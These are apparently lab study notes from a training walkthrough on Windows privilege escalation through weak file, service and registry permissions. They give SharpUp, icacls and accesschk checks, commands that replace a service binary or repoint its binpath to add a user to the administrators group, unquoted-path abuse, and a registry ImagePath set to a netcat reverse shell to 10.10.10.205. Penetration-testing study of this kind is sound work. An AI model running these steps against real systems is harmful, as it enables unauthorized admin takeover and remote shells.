# Weak Permissions

## Permissive File System ACLs

### Sharpup

To check weak ACL

```
.\SharpUp.exe audit
```

<figure><img src="../../../.gitbook/assets/Weak Permissions.png" alt=""><figcaption></figcaption></figure>

**Checking permissions with icacls**

Previously discovered appliaction:&#x20;

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

<figure><img src="../../../.gitbook/assets/Weak Permissions-1.png" alt=""><figcaption></figcaption></figure>

### Replace service binary

```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

```
sc start SecurityService
```

## Weak Service Permissions

Check sharpup again for misconfigured services:

<figure><img src="../../../.gitbook/assets/Weak Permissions-2.png" alt=""><figcaption></figcaption></figure>

&#x20;Check permission with accesschk

The flags we use, in order, are _-q_ (omit banner), _-u_ (suppress errors), _-v_ (verbose), _-c_ (specify name of a Windows service), and _-w_ (show only objects that have write access).

```
accesschk.exe /accepteula -quvcw WindscribeService
```

<figure><img src="../../../.gitbook/assets/Weak Permissions-3.png" alt=""><figcaption></figcaption></figure>

Here we can see that all Authenticated Users have SERVICE\_ALL\_ACCESS rights over the service, which means full read/write control over it.

We are not in admin group currently

### Change service binary path

```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

Then restart service:

```
sc stop WindscribeService
sc start WindscribeService
```

Now we are in local admin group:

```
net localgroup administrators
```

Another notable example is the _Windows Update Orchestrator Service (UsoSvc)_

## Unquoted Service Path

For example: `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

The following paths are search and **.exe** is implied

* `C:\Program`
* `C:\Program Files`
* `C:\Program Files (x86)\System`
* \`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64\`\`

So if we can create these files we can get admin privilege:

* `C:\Program.exe\`
* `C:\Program Files (x86)\System.exe`

To find:

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Permissive Registry ACLs

It is also worth searching for weak service ACLs in the Windows Registry. We can do this using **accesschk**.

### Checking for Weak Service ACLs in Registry

```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

<figure><img src="../../../.gitbook/assets/Weak Permissions-4.png" alt=""><figcaption></figcaption></figure>

We can abuse this using the PowerShell cmdlet Set-ItemProperty to change the ImagePath value, using a command such as:

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary

### Check Startup Programs

```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
